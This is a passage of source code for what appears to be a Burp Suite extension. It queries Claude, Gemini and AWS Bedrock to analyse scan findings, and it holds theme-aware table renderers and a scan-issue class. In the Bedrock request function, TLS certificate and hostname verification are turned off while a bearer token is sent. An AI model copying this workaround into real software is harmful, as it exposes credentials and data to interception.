                    else:
                        ai_response = ""
        except:
            ai_response = ""
        if ai_response is None:
            ai_response = ""
        
        # Sanitize response to handle unicode characters
        ai_response = self._sanitize_ai_json_text(ai_response)

        usage = data.get("usage", {})
        prompt_tokens = usage.get("prompt_tokens", self._estimate_token_count(prompt))
        completion_tokens = usage.get("completion_tokens", self._estimate_token_count(ai_response))
        self._record_token_usage(prompt_tokens, completion_tokens)
        
        if isinstance(ai_response, unicode):
            try:
                return ai_response.encode("utf-8")
            except:
                pass
        return ai_response
    
    def _ask_claude(self, prompt):
        """Send request to Claude with configurable timeout"""
        req = urllib2.Request(
            self.API_URL.rstrip('/') + "/messages",
            data=json.dumps({
                "model": self.MODEL,
                "max_tokens": self.MAX_TOKENS,
                "messages": [{"role": "user", "content": prompt}]
            }, ensure_ascii=False).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "x-api-key": self.API_KEY,
                "anthropic-version": "2023-06-01"
            }
        )
        
        resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
        data = json.loads(resp.read())
        ai_response = data["content"][0]["text"]
        
        # Sanitize response to handle unicode characters
        ai_response = self._sanitize_ai_json_text(ai_response)
        
        usage = data.get("usage", {})
        prompt_tokens = usage.get("input_tokens", self._estimate_token_count(prompt))
        completion_tokens = usage.get("output_tokens", self._estimate_token_count(ai_response))
        self._record_token_usage(prompt_tokens, completion_tokens)
        return ai_response
    
    def _ask_gemini(self, prompt):
        """Send request to Google Gemini with configurable timeout"""
        req = urllib2.Request(
            self.API_URL.rstrip('/') + "/models/%s:generateContent?key=%s" % (self.MODEL, self.API_KEY),
            data=json.dumps({
                "contents": [{"parts": [{"text": prompt}]}],
                "generationConfig": {
                    "maxOutputTokens": self.MAX_TOKENS,
                    "temperature": 0.0
                }
            }, ensure_ascii=False).encode("utf-8"),
            headers={"Content-Type": "application/json"}
        )
        
        resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
        data = json.loads(resp.read())
        ai_response = data["candidates"][0]["content"]["parts"][0]["text"]
        
        # Sanitize response to handle unicode characters
        ai_response = self._sanitize_ai_json_text(ai_response)
        
        usage = data.get("usageMetadata", {})
        prompt_tokens = usage.get("promptTokenCount", self._estimate_token_count(prompt))
        completion_tokens = usage.get("candidatesTokenCount", self._estimate_token_count(ai_response))
        self._record_token_usage(prompt_tokens, completion_tokens)
        return ai_response

    def _ask_bedrock(self, prompt):
        """Send request to AWS Bedrock Claude with bearer token authentication"""
        region = (self.BEDROCK_REGION or "us-east-1").strip()
        base_url = (self.API_URL or "").strip()
        if not base_url:
            base_url = "https://bedrock-runtime.%s.amazonaws.com" % region
        host = base_url.replace("https://", "").replace("http://", "").split("/")[0]
        invoke_path = "/model/%s/invoke" % self.MODEL
        invoke_url = "https://%s%s" % (host, invoke_path)

        payload_obj = {
            "anthropic_version": "bedrock-2023-05-31",
            "max_tokens": self.MAX_TOKENS,
            "messages": [
                {
                    "role": "user",
                    "content": [{"type": "text", "text": prompt}]
                }
            ]
        }
        # Sanitize prompt to ASCII to prevent codec errors with non-ASCII response bodies
        try:
            if isinstance(prompt, unicode):
                prompt = prompt.encode("ascii", "replace").decode("ascii")
            else:
                prompt = prompt.decode("utf-8", "replace").encode("ascii", "replace").decode("ascii")
            # Patch the payload text with the sanitized prompt
            payload_obj["messages"][0]["content"][0]["text"] = prompt
        except:
            pass
        payload_text = json.dumps(payload_obj, ensure_ascii=True)

        bearer_token = self._normalize_bedrock_api_key(self.API_KEY)
        if not bearer_token:
            raise Exception("Bedrock credentials missing: set API Key (Bearer token) in Settings")
        headers = {
            "Authorization": "Bearer " + bearer_token,
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

        max_retries = 1
        retry_count = 0
        while retry_count <= max_retries:
            req = urllib2.Request(invoke_url, data=payload_text.encode("utf-8"), headers=headers)
            try:
                if self.VERBOSE and retry_count > 0:
                    self.stdout.println("[DEBUG] Bedrock retry attempt %d/%d..." % (retry_count, max_retries))
                # Create SSL context that bypasses certificate verification (for Java SSL issues)
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT, context=ctx)
                raw_body = resp.read()
                if isinstance(raw_body, bytes):
                    raw_body = raw_body.decode("utf-8", "ignore")
                try:
                    data = json.loads(raw_body)
                except Exception:
                    raise Exception("Bedrock returned non-JSON response: %s" % str(raw_body)[:300])
                break
            except urllib2.URLError as e:
                try:
                    msg = str(e).lower()
                except:
                    try:
                        msg = unicode(e).lower().encode("ascii", "ignore")
                    except:
                        msg = "urlerror"
                if "timed out" in msg or "timeout" in msg:
                    retry_count += 1
                    if retry_count <= max_retries:
                        self.stderr.println("[!] Bedrock request timeout, retrying... (%d/%d)" % (retry_count, max_retries))
                        time.sleep(2)
                        continue
                    self.stderr.println("[!] Bedrock request failed after %d retries (timeout: %ds)" %
                                        (max_retries, int(self.AI_REQUEST_TIMEOUT)))
                    self.stderr.println("[!] Increase timeout in Settings > Advanced, or reduce scan concurrency.")
                raise
            except urllib2.HTTPError as e:
                body = ""
                try:
                    body = e.read()
                    if isinstance(body, bytes):
                        body = body.decode("utf-8", "ignore")
                except:
                    body = ""
                try:
                    if isinstance(body, unicode):
                        body_text = body
                    else:
                        body_text = unicode(body, "utf-8", "ignore")
                except:
                    try:
                        body_text = unicode(body)
                    except:
                        body_text = u""
                body_l = body_text.lower()
                if "invalid api key format" in body_l or "must start with pre-defined prefix" in body_l:
                    raise Exception("Bedrock API key format invalid. Use bearer token value (not AKIA/ASIA access key IDs).")
                if "on-demand throughput isnt supported" in body_l or "on-demand throughput isn't supported" in body_l:
                    raise Exception("Bedrock model invocation mode mismatch. Use 'us.anthropic.claude-sonnet-4-6' or your inference profile ID/ARN.")
                raise Exception("Bedrock HTTP %d: %s" % (e.code, body_text.encode("ascii", "ignore")[:300]))
            except Exception as e:
                try:
                    msg = str(e).lower()
                except:
                    try:
                        msg = unicode(e).lower().encode("ascii", "ignore")
                    except:
                        msg = "error"
                if "timed out" in msg or "timeout" in msg:
                    retry_count += 1
                    if retry_count <= max_retries:
                        self.stderr.println("[!] Bedrock request timeout, retrying... (%d/%d)" % (retry_count, max_retries))
                        time.sleep(1)
                        continue
                    raise Exception("Bedrock request timed out after %ds" % int(self.AI_REQUEST_TIMEOUT))
                raise

        ai_response = ""
        content_groups = []
        content_groups.append(data.get("content", []))
        output_obj = data.get("output", {})
        if isinstance(output_obj, dict):
            content_groups.append(output_obj.get("content", []))
            message_obj = output_obj.get("message", {})
            if isinstance(message_obj, dict):
                content_groups.append(message_obj.get("content", []))
        message_obj = data.get("message", {})
        if isinstance(message_obj, dict):
            content_groups.append(message_obj.get("content", []))

        for content_items in content_groups:
            if isinstance(content_items, list):
                for item in content_items:
                    if isinstance(item, dict) and "text" in item:
                        text_val = item.get("text", "")
                        if isinstance(text_val, unicode):
                            ai_response += text_val
                        else:
                            try:
                                ai_response += str(text_val)
                            except:
                                ai_response += unicode(text_val, "utf-8", "ignore")
        if not ai_response:
            raw_text = (
                data.get("completion", "") or
                data.get("outputText", "") or
                (output_obj.get("outputText", "") if isinstance(output_obj, dict) else "")
            )
            if isinstance(raw_text, unicode):
                ai_response = raw_text
            else:
                try:
                    ai_response = str(raw_text)
                except:
                    ai_response = unicode(raw_text, "utf-8", "ignore")
        if not ai_response.strip():
            try:
                key_preview = ",".join([str(k) for k in data.keys()])
            except:
                key_preview = "unknown"
            raise Exception("Bedrock response contained no text output. Response keys: %s" % key_preview[:200])
        
        # Sanitize response to handle unicode characters
        ai_response = self._sanitize_ai_json_text(ai_response)

        usage = data.get("usage", {})
        has_prompt_usage = (usage.get("input_tokens") is not None) or (usage.get("inputTokens") is not None)
        has_completion_usage = (usage.get("output_tokens") is not None) or (usage.get("outputTokens") is not None)

        prompt_tokens = usage.get("input_tokens", usage.get("inputTokens", self._estimate_token_count(prompt)))
        completion_tokens = usage.get("output_tokens", usage.get("outputTokens", self._estimate_token_count(ai_response)))

        if not has_prompt_usage or not has_completion_usage:
            self._bedrock_usage_estimate_warned = True

        self._record_token_usage(prompt_tokens, completion_tokens)
        return ai_response

    def _normalize_bedrock_api_key(self, raw_value):
        token = str(raw_value or "").strip()
        if not token:
            return ""

        if token.startswith("export "):
            token = token[len("export "):].strip()

        if token.startswith("AWS_BEARER_TOKEN_BEDROCK="):
            token = token.split("=", 1)[1].strip()

        if token.lower().startswith("bearer "):
            token = token[7:].strip()

        if (token.startswith('"') and token.endswith('"')) or (token.startswith("'") and token.endswith("'")):
            token = token[1:-1].strip()

        return token
    
    def _fix_truncated_json(self, text):
        if not text: return "[]"
        try:
            json.loads(text)
            return text
        except: pass
        
        last_brace = text.rfind('}')
        if last_brace > 0:
            prefix = text[:last_brace + 1]
            if prefix.count('[') > prefix.count(']'):
                try:
                    fixed = prefix + '\n]'
                    json.loads(fixed)
                    return fixed
                except: pass
        return "[]"


# UI Component Classes

class FPRowFilter(RowFilter):
    """RowFilter that hides non-reportable findings unless show hidden is enabled."""
    def __init__(self, extender):
        super(FPRowFilter, self).__init__()
        self.extender = extender

    def include(self, entry):
        try:
            row = entry.getIdentifier()
            if self.extender._show_fp_findings:
                return True
            with self.extender.findings_lock_ui:
                if row < len(self.extender.findings_list):
                    return not self.extender._finding_hidden_from_normal_view(
                        self.extender.findings_list[row])
        except:
            pass
        return True


class ThemeAwareHeaderRenderer(DefaultTableCellRenderer):
    """Header renderer that applies dark/light theme colors with visible column separators."""
    def __init__(self, extender=None):
        DefaultTableCellRenderer.__init__(self)
        self.extender = extender

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column)
        dark = _renderer_dark_mode(self.extender, table)
        if dark:
            c.setBackground(Color(0x1A, 0x2F, 0x42))
            c.setForeground(Color(0x00, 0xF5, 0xA0))
            sep_color = Color(0x00, 0xF5, 0xA0, 0x60)
        else:
            c.setBackground(UIManager.getColor("TableHeader.background"))
            c.setForeground(UIManager.getColor("TableHeader.foreground"))
            sep_color = Color(0x99, 0x99, 0x99)
        c.setFont(Font("Monospaced", Font.BOLD, 12))
        c.setOpaque(True)
        # Add a visible right-edge separator so drag zones are obvious
        from javax.swing.border import MatteBorder
        c.setBorder(MatteBorder(0, 0, 0, 2, sep_color))
        return c


def _renderer_dark_mode(extender=None, table=None):
    try:
        if extender is not None and extender._detect_burp_theme() == "Dark":
            return True
    except:
        pass

    try:
        if extender is not None and extender._resolved_theme() == "Dark":
            return True
    except:
        pass

    try:
        if table is not None:
            bg = table.getBackground()
            if bg is not None:
                return (bg.getRed() + bg.getGreen() + bg.getBlue()) < 384
    except:
        pass

    try:
        panel_bg = UIManager.getColor("Panel.background")
        if panel_bg is not None:
            return (panel_bg.getRed() + panel_bg.getGreen() + panel_bg.getBlue()) < 384
    except:
        pass

    return True


class ThemeAwareCellRenderer(DefaultTableCellRenderer):
    """Base renderer that applies dark/light alternating row colors to any column."""
    def __init__(self, extender=None):
        DefaultTableCellRenderer.__init__(self)
        self.extender = extender

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column)
        dark = _renderer_dark_mode(self.extender, table)

        if isSelected:
            c.setBackground(Color(0x00, 0x6A, 0x4E) if dark else Color(0x00, 0x78, 0xD4))
            c.setForeground(Color(0xE0, 0xFF, 0xF0) if dark else Color.WHITE)
            c.setFont(Font("Monospaced", Font.BOLD, 12))
        else:
            if dark:
                c.setBackground(Color(0x0C, 0x18, 0x26) if row % 2 == 0 else Color(0x16, 0x24, 0x38))
                c.setForeground(Color(0xD5, 0xF9, 0xEA))
            else:
                c.setBackground(Color.WHITE if row % 2 == 0 else Color(0xF0, 0xF0, 0xF0))
                c.setForeground(Color.BLACK)
            c.setFont(Font("Monospaced", Font.PLAIN, 12))

        c.setOpaque(True)
        return c


class StatusCellRenderer(DefaultTableCellRenderer):
    def __init__(self, extender=None):
        DefaultTableCellRenderer.__init__(self)
        self.extender = extender

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column)
        dark = _renderer_dark_mode(self.extender, table)

        if isSelected:
            c.setBackground(Color(0x00, 0x6A, 0x4E) if dark else Color(0x00, 0x78, 0xD4))
            c.setForeground(Color(0xE0, 0xFF, 0xF0) if dark else Color.WHITE)
            c.setFont(Font("Monospaced", Font.BOLD, 12))
            c.setOpaque(True)
            return c

        if dark:
            c.setBackground(Color(0x0C, 0x18, 0x26) if row % 2 == 0 else Color(0x16, 0x24, 0x38))
        else:
            c.setBackground(Color.WHITE if row % 2 == 0 else Color(0xF0, 0xF0, 0xF0))

        c.setFont(Font("Monospaced", Font.BOLD, 12))

        if value:
            status = str(value)
            if "Cancelled" in status:
                c.setForeground(Color(0xFF, 0x6B, 0x6B) if dark else Color(0xCC, 0x00, 0x00))
            elif "Paused" in status:
                c.setForeground(Color(0xFF, 0xD1, 0x66) if dark else Color(0xCC, 0x88, 0x00))
            elif "Error" in status:
                c.setForeground(Color(0xFF, 0x4D, 0x67) if dark else Color(0xCC, 0x00, 0x00))
            elif "Skipped" in status:
                c.setForeground(Color(0xFF, 0xA8, 0x4A) if dark else Color(0xCC, 0x66, 0x00))
            elif "Completed" in status:
                c.setForeground(Color(0x2E, 0xF2, 0x9B) if dark else Color(0x00, 0x88, 0x00))
            elif "Analyzing" in status or "Waiting" in status:
                c.setForeground(Color(0x62, 0xE7, 0xFF) if dark else Color(0x00, 0x66, 0xCC))
            elif "Queued" in status:
                c.setForeground(Color(0x8B, 0x9A, 0xA7) if dark else Color(0x66, 0x66, 0x66))
            else:
                c.setForeground(Color(0xD5, 0xF9, 0xEA) if dark else Color.BLACK)

        c.setOpaque(True)
        return c

class SeverityCellRenderer(DefaultTableCellRenderer):
    def __init__(self, extender=None):
        DefaultTableCellRenderer.__init__(self)
        self.extender = extender

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column)
        c.setFont(Font("Monospaced", Font.BOLD, 12))

        if isSelected:
            c.setBackground(Color(0x00, 0x6A, 0x4E))
            c.setForeground(Color(0xE0, 0xFF, 0xF0))
            c.setOpaque(True)
            return c

        # Severity colors are high-contrast and work in both themes
        if value:
            severity = str(value)
            if severity == "Critical":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(0xB5, 0x1F, 0x2D))
            elif severity == "High":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(0xE6, 0x3B, 0x2E))
            elif severity == "Medium":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(0xFF, 0x8A, 0x24))
            elif severity == "Low":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(0x3E, 0xB7, 0x72))
            elif severity == "Information":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(0x1E, 0x8C, 0xC7))
            else:
                dark = _renderer_dark_mode(self.extender, table)
                c.setForeground(Color(0xD5, 0xF9, 0xEA) if dark else Color.BLACK)
                c.setBackground(Color(0x0E, 0x1A, 0x24) if dark else Color.WHITE)

        c.setOpaque(True)
        return c

class ConfidenceCellRenderer(DefaultTableCellRenderer):
    def __init__(self, extender=None):
        DefaultTableCellRenderer.__init__(self)
        self.extender = extender

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column)
        dark = _renderer_dark_mode(self.extender, table)
        c.setFont(Font("Monospaced", Font.BOLD, 11))

        if isSelected:
            c.setBackground(Color(0x00, 0x6A, 0x4E) if dark else Color(0x00, 0x78, 0xD4))
            c.setForeground(Color(0xE0, 0xFF, 0xF0) if dark else Color.WHITE)
            c.setFont(Font("Monospaced", Font.BOLD, 11))
            c.setOpaque(True)
            return c

        if dark:
            c.setBackground(Color(0x0C, 0x18, 0x26) if row % 2 == 0 else Color(0x16, 0x24, 0x38))
        else:
            c.setBackground(Color.WHITE if row % 2 == 0 else Color(0xF0, 0xF0, 0xF0))

        if value:
            confidence = str(value)
            if confidence == "Certain":
                c.setForeground(Color(0x2E, 0xF2, 0x9B) if dark else Color(0x00, 0x88, 0x00))
            elif confidence == "Firm":
                c.setForeground(Color(0x62, 0xE7, 0xFF) if dark else Color(0x00, 0x66, 0xCC))
            elif confidence == "Tentative":
                c.setForeground(Color(0xFF, 0xC3, 0x66) if dark else Color(0xCC, 0x88, 0x00))
            else:
                c.setForeground(Color(0xD5, 0xF9, 0xEA) if dark else Color.BLACK)

        c.setOpaque(True)
        return c


class TruncatedUrlCellRenderer(DefaultTableCellRenderer):
    """Renderer that truncates long URLs and shows full URL in tooltip."""
    def __init__(self, max_chars=80, extender=None):
        DefaultTableCellRenderer.__init__(self)
        self.max_chars = max_chars
        self.extender = extender

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, column)
        dark = _renderer_dark_mode(self.extender, table)

        if isSelected:
            c.setBackground(Color(0x00, 0x6A, 0x4E) if dark else Color(0x00, 0x78, 0xD4))
            c.setForeground(Color(0xE0, 0xFF, 0xF0) if dark else Color.WHITE)
            c.setFont(Font("Monospaced", Font.BOLD, 12))
        else:
            if dark:
                c.setBackground(Color(0x0C, 0x18, 0x26) if row % 2 == 0 else Color(0x16, 0x24, 0x38))
                c.setForeground(Color(0xD5, 0xF9, 0xEA))
            else:
                c.setBackground(Color.WHITE if row % 2 == 0 else Color(0xF0, 0xF0, 0xF0))
                c.setForeground(Color.BLACK)
            c.setFont(Font("Monospaced", Font.PLAIN, 12))

        c.setOpaque(True)
        if value:
            url_str = str(value)
            if len(url_str) > self.max_chars:
                c.setText(url_str[:self.max_chars] + "...")
            c.setToolTipText("<html><body style='width:600px'>%s</body></html>" % url_str)
        return c

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, messages, name, detail, severity, confidence):
        self._httpService = httpService
        self._url = url
        self._messages = messages
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence

    def getUrl(self): return self._url
    def getIssueName(self): return self._name
    def getIssueType(self): return 0x80000003
    def getSeverity(self): return self._severity
    def getConfidence(self): return self._confidence
    def getIssueDetail(self): return self._detail
    def getHttpMessages(self): return self._messages
    def getHttpService(self): return self._httpService
    def getIssueBackground(self): return None
    def getRemediationBackground(self): return None
    def getRemediationDetail(self): return None
